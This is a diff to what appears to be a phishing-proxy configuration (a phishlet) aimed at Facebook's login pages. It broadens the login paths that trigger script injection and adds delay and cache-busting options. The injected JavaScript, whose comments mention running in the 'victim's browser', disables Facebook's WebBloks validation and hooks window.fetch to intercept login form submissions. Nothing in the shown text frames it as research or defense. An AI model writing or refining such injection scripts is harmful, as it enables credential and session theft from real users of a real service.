@@ -63,7 +63,9 @@ login:
 
 js_inject:
   - trigger_domains: ["www.facebook.com"]
-    trigger_paths: ["/login/"]
+    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
+    inject_delay: 2000
+    cache_buster: true
     script: |
       // Bypass WebBloks validation
       window.Bloks = {
@@ -73,7 +75,10 @@ js_inject:
       // Run in victim's browser console
       console.log('Bloks status:', typeof Bloks, Bloks?.validatePayload);
       Object.defineProperty(window, 'fb_web_bloks', {value: false});
-
+      function debug(){
+      console.log('loaded')
+      
+      }
       // Intercept form submission
       const origFetch = window.fetch;
       window.fetch = function(url, options) {
@@ -118,3 +123,4 @@ js_inject:
           }
         }
       }, true);
+      debug()
